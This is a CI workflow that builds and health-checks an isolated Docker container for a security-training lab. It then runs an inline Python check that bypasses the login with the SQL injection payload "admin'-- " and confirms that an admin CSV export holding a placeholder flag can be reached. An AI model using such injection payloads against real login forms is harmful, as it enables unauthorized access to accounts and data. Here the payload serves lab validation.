name: Validate Credential Gate lab

on:
  pull_request:
    paths:
      - "labs/credential-gate/**"
      - ".github/workflows/credential-gate.yml"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  validate:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - name: Python integration tests
        run: python3 -m unittest discover -s labs/credential-gate/tests -v
      - name: Build isolated Docker image
        run: docker build -t credential-gate:ci labs/credential-gate
      - name: Verify Docker health and real SQLi chain
        run: |
          set -euo pipefail
          container=$(docker run -d --network none credential-gate:ci)
          cleanup() {
            docker logs "$container"
            docker rm -f "$container"
          }
          trap cleanup EXIT
          status="starting"
          for i in $(seq 1 60); do
            status=$(docker inspect -f '{{.State.Health.Status}}' "$container")
            if [ "$status" = "healthy" ]; then break; fi
            if [ "$status" = "unhealthy" ]; then break; fi
            sleep 2
          done
          test "$status" = "healthy"
          docker exec -i "$container" python - <<'PY'
          import http.cookiejar
          import urllib.parse
          import urllib.request

          root = "http://127.0.0.1:8080"
          client = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
          assert client.open(root + "/healthz").status == 200
          payload = urllib.parse.urlencode({"username": "admin'-- ", "password": "wrong"}).encode()
          client.open(root + "/login", data=payload)
          with client.open(root + "/reports/export.csv") as response:
              contents = response.read().decode("utf-8")
          assert "TTP{credential_gate_demo_replace_before_publish}" in contents, "Expected SQLi-enabled admin export"
          print("Isolated Docker SQLi chain verified")
          PY
